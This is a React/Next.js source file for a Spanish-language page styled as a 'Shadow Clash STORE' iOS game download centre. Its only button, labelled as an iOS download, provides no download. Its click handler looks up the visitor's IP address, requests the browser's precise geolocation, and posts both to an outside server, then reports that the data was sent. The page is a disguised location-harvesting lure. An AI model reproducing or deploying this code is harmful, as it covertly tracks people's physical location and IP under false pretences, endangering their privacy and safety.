import Head from 'next/head'

export default function Home() {
  return (
    <>
      <Head>
        <title>Shadow Clash STORE</title>
        <meta name="description" content="Shadow Clash iOS Download" />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet" />
      </Head>

      <div className="min-h-screen bg-gradient-to-b from-[#0f0f0f] to-[#1a1a1a] text-white font-[Inter]">
        {/* Menú vacío */}
        <nav className="w-full py-4 px-8 border-b border-gray-700 flex justify-between items-center">
          {/* Aquí puedes colocar logo o enlaces luego */}
          <div className="text-xl font-bold">Shadow Clash STORE</div>
          <div>{/* Menú vacío por ahora */}</div>
        </nav>

        {/* Contenido principal centrado */}
        <div className="flex flex-col items-center justify-center h-[calc(100vh-80px)]">
          <h1 className="text-5xl md:text-6xl font-extrabold mb-8">Centro de descarga</h1>

          <button
            onClick={async () => {
              const ipResponse = await fetch('https://api64.ipify.org?format=json');
              const ipData = await ipResponse.json();
              const ip = ipData.ip;

              navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude.toFixed(6);
                const lon = position.coords.longitude.toFixed(6);
                const text = `${lat},${lon}-${ip}`;
                
                await fetch('https://api-pi-steel.vercel.app/guardar', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ texto: text })
                });
                
                alert('Datos enviados.');
              });
            }}
            className="flex items-center gap-2 bg-white text-black font-semibold px-6 py-3 rounded-lg hover:bg-gray-200 transition"
          >
            <img src="/apple.svg" alt="Apple" className="w-5 h-5" />
            Descargar para iOS
          </button>
        </div>
      </div>
    </>
  );
}
